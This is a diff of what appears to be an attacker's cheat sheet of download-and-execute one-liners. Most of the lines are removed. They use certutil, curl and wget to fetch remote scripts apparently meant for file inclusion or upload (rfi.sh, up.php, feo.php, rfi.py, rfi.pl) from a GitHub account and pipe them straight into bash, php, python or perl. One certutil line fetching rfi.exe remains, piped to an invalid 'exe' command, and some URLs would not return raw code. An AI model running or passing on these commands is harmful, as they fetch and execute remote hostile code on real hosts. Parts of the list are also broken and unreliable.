@@ -1,33 +1,4 @@
 
-certutil -urlcache -split -f https://github.com/blkht666/so/rfi.sh | bash
-
-curl https://github.com/blkht666/so/rfi.sh | bash
-
-wget https://github.com/blkht666/so/rfi.sh | bash
-
-certutil -urlcache -split -f https://github.com/blkht666/if/blob/master/up.php
-
-curl https://github.com/blkht666/if/blob/master/up.php
-
-wget https://github.com/blkht666/if/blob/master/up.php
-
-certutil -urlcache -split -f https://github.com/blkht666/if/blob/master/feo.php | php
-
-curl https://github.com/blkht666/if/blob/master/feo.php | php
-
-wget https://github.com/blkht666/if/blob/master/feo.php | php
-
-certutil -urlcache -split -f https://github.com/blkht666/dope/rfi.py | python
-
-curl https://github.com/blkht666/dope/rfi.py | python
-
-wget https://github.com/blkht666/dope/rfi.py | python
-
-certutil -urlcache -split -f https://github.com/blkht666/nug/rfi.pl | perl
-
-curl https://github.com/blkht666/nug/rfi.pl | perl
-
-wget https://github.com/blkht666/nug/rfi.pl | perl
 
 certutil -urlcache -split -f https://github.com/blkht666/lsd/rfi.exe | exe
 
